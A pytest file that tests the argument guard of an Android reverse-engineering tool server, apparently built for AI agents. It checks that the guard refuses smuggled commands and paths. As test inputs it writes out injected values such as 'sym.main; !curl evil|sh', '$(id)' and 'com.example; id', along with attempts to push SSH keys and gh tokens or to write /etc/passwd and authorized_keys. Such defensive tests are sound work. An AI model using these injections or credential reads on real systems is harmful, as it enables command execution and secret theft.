import pytest

from pathlib import Path

from android_re_mcp import guard


def refused(tool, args):
    with pytest.raises(guard.GuardError):
        guard.validate(tool, args)


@pytest.mark.parametrize("target", ["x;!id", "0x0;!id", "sym.main; !curl evil|sh", "a b", "$(id)", "", "x\nid"])
def test_native_disasm_rejects_radare_syntax(target):
    refused("native_disasm", {"so_path": "/x/lib.so", "target": target})


@pytest.mark.parametrize("target", ["main", "Java_com_example_Foo_bar", "0x1f40", "_ZN3foo3barEv", "JNI_OnLoad"])
def test_native_disasm_accepts_symbols_and_offsets(target):
    assert guard.validate("native_disasm", {"so_path": "/x/lib.so", "target": target})["target"] == target


def test_path_must_not_start_with_dash():
    refused("apk_decompile", {"apk_path": "--help"})
    refused("search_strings", {"path": "-x", "pattern": "a"})


def test_path_rejects_protected_locations(isolated_env):
    refused("adb_push", {"local": str(isolated_env / ".ssh" / "id_ed25519"), "remote": "/sdcard/x"})
    refused("adb_pull", {"local": str(isolated_env / ".bashrc"), "remote": "/sdcard/x"})
    refused("adb_push", {"local": "~/.config/gh/hosts.yml", "remote": "/sdcard/x"})


def test_write_into_real_etc_is_refused():
    refused("dex_convert", {"output_path": "/etc/passwd"})


def test_etc_base_is_used_resolved(monkeypatch, tmp_path):
    """The /etc rule compares the resolved value against the (patched) base."""
    etc = tmp_path / "etc"
    etc.mkdir()
    work = tmp_path / "work"
    work.mkdir()
    (work / "link").symlink_to(etc)
    monkeypatch.setattr(guard, "_ETC_BASE", etc)
    # a valid output suffix, so the ONLY possible refusal here is the /etc rule
    refused("dex_convert", {"output_path": str(work / "link" / "x.dex")})
    # the /etc rule only constrains writes
    guard.validate("apk_identify", {"apk_path": str(etc / "app.apk")})


def test_the_etc_base_is_the_resolved_constant():
    # on Linux this is trivially /etc; on macOS resolve() maps it to
    # /private/etc, which is exactly the case the constant fixes (F8).
    assert guard._ETC_BASE == Path("/etc").resolve()


def test_unresolvable_home_fails_closed(monkeypatch):
    """Path.home() failing must surface as a GuardError, not a crash (F8)."""
    import pathlib

    def broken_home():
        raise RuntimeError("no HOME")

    monkeypatch.setattr(pathlib.Path, "home", classmethod(lambda cls: broken_home()))
    refused("dex_convert", {"output_path": "/tmp/ok/output.dex"})


def test_symlink_into_protected_location_is_refused(isolated_env, tmp_path):
    (isolated_env / ".ssh").mkdir()
    link = tmp_path / "innocent.txt"
    link.symlink_to(isolated_env / ".ssh")
    refused("adb_push", {"local": str(link), "remote": "/sdcard/x"})


def test_allowed_dirs(tmp_path, monkeypatch):
    work = tmp_path / "work"
    work.mkdir()
    monkeypatch.setenv("ANDROID_RE_MCP_ALLOWED_DIRS", str(work))
    guard.validate("apk_identify", {"apk_path": str(work / "a.apk")})
    refused("apk_identify", {"apk_path": str(tmp_path / "other.apk")})
    refused("apk_identify", {"apk_path": str(work / ".." / "other.apk")})


def test_era_batch_host_paths_are_guarded(tmp_path, monkeypatch):
    """output_dir/output_path/dex_paths from the era batch refuse outside dirs."""
    work = tmp_path / "work"
    work.mkdir()
    monkeypatch.setenv("ANDROID_RE_MCP_ALLOWED_DIRS", str(work))
    guard.validate("dex_split", {"dex_path": str(work / "a.dex"),
                                  "output_dir": str(work / "out")})
    refused("dex_split", {"dex_path": str(work / "a.dex"),
                          "output_dir": str(tmp_path / "elsewhere")})
    guard.validate("dex_merge", {"dex_paths": [str(work / "a.dex"), str(work / "b.dex")],
                                 "output_path": str(work / "m.dex")})
    refused("dex_merge", {"dex_paths": [str(work / "a.dex"), str(tmp_path / "outside.dex")],
                          "output_path": str(work / "m.dex")})
    refused("dex_merge", {"dex_paths": "not-a-list"})


def test_zip_and_rules_dir_host_paths_are_guarded(tmp_path, monkeypatch):
    """zip_path and rules_dir are host reads; the allowed-dirs rule applies."""
    work = tmp_path / "work"
    work.mkdir()
    monkeypatch.setenv("ANDROID_RE_MCP_ALLOWED_DIRS", str(work))
    guard.validate("zip_test", {"zip_path": str(work / "a.zip")})
    refused("zip_test", {"zip_path": str(tmp_path / "outside.zip")})
    guard.validate("quark_scan", {"apk_path": str(work / "a.apk"),
                                  "rules_dir": str(work / "rules")})
    refused("quark_scan", {"apk_path": str(work / "a.apk"),
                           "rules_dir": str(tmp_path / "rules")})


def test_etc_reads_are_allowed_for_the_new_keys():
    """The /etc rule constrains writes only; both new keys are reads."""
    guard.validate("zip_test", {"zip_path": "/etc/hosts"})
    guard.validate("quark_scan", {"apk_path": "/etc/hosts", "rules_dir": "/etc"})


def test_zip_path_has_no_output_suffix_rule():
    """No OUTPUT_SUFFIXES entry for zip_test: any suffix is a valid read."""
    guard.validate("zip_test", {"zip_path": "/tmp/anything.txt"})


def test_zip_update_nested_from_file_is_guarded(isolated_env, tmp_path, monkeypatch):
    """zip_update's ops[].from_file is a host read and must use check_path."""
    (isolated_env / ".ssh").mkdir()
    secret = isolated_env / ".ssh" / "id_ed25519"
    secret.write_text("PRIVATE")
    with pytest.raises(guard.GuardError):
        guard.validate("zip_update", {
            "zip_path": str(tmp_path / "a.zip"),
            "ops": [{"op": "add", "entry_path": "x", "from_file": str(secret)}],
        })
    guard.validate("zip_update", {
        "zip_path": str(tmp_path / "a.zip"),
        "ops": [{"op": "add", "entry_path": "x", "from_file": str(tmp_path / "ok.bin")}],
    })
    with pytest.raises(guard.GuardError):
        guard.validate("zip_update", {
            "zip_path": str(tmp_path / "a.zip"),
            "ops": [{"op": "add", "entry_path": "x", "from_file": 7}],
        })

    work = tmp_path / "work"
    work.mkdir()
    outside = tmp_path / "outside.bin"
    outside.write_text("outside")
    monkeypatch.setenv("ANDROID_RE_MCP_ALLOWED_DIRS", str(work))
    with pytest.raises(guard.GuardError):
        guard.validate("zip_update", {
            "zip_path": str(work / "a.zip"),
            "ops": [{"op": "add", "entry_path": "x", "from_file": str(outside)}],
        })
    link = work / "link.bin"
    link.symlink_to(outside)
    with pytest.raises(guard.GuardError):
        guard.validate("zip_update", {
            "zip_path": str(work / "a.zip"),
            "ops": [{"op": "add", "entry_path": "x", "from_file": str(link)}],
        })
    guard.validate("zip_update", {
        "zip_path": str(work / "a.zip"),
        "ops": [{"op": "add", "entry_path": "x", "from_file": str(work / "ok.bin")}],
    })


def test_output_suffixes():
    guard.validate("mitm_export_har", {"output_path": "/tmp/x/out.har"})
    refused("mitm_export_har", {"output_path": "/tmp/x/authorized_keys"})
    refused("scrcpy_screenshot", {"output_path": "/tmp/x/shot.sh"})
    guard.validate("dex_merge", {"dex_paths": ["/tmp/x/a.dex", "/tmp/x/b.dex"],
                                 "output_path": "/tmp/x/out.dex"})
    guard.validate("dex_merge", {"dex_paths": ["/tmp/x/a.dex", "/tmp/x/b.dex"],
                                 "output_path": "/tmp/x/out.cdex"})
    refused("dex_merge", {"dex_paths": ["/tmp/x/a.dex", "/tmp/x/b.dex"],
                          "output_path": "/tmp/x/out.txt"})


def test_package_and_serial_and_port():
    guard.validate("frida_attach", {"package": "com.example.app"})
    guard.validate("frida_attach", {"package": "com.example.app:service", "serial": "192.168.1.5:5555"})
    refused("frida_attach", {"package": "com.example; id"})
    refused("memory_read", {"package": "../../etc"})
    refused("memory_read", {"package": "/etc"})
    refused("adb_shell", {"command": "id", "serial": "-s evil"})
    refused("mitm_start", {"port": 22})
    refused("mitm_start", {"port": "abc"})


def test_frida_server_push_arguments():
    guard.validate("frida_server_push", {"abi": "arm64", "remote_path": "/data/local/tmp/frida-server"})
    refused("frida_server_push", {"remote_path": "/data/local/tmp/x; id"})
    refused("frida_server_push", {"abi": "../../bin"})


def test_install_tool_is_off_by_default(monkeypatch):
    refused("install_tool", {"tool_name": "jadx"})
    monkeypatch.setenv("ANDROID_RE_MCP_ALLOW_INSTALL", "1")
    guard.validate("install_tool", {"tool_name": "jadx"})


def test_disable_tools_env(monkeypatch):
    monkeypatch.setenv("ANDROID_RE_MCP_DISABLE_TOOLS", "adb_shell, frida_inject")
    refused("adb_shell", {"command": "id"})
    refused("frida_inject", {"script": "1"})
    guard.validate("adb_devices", {})


def test_arguments_must_be_an_object():
    refused("adb_devices", ["x"])
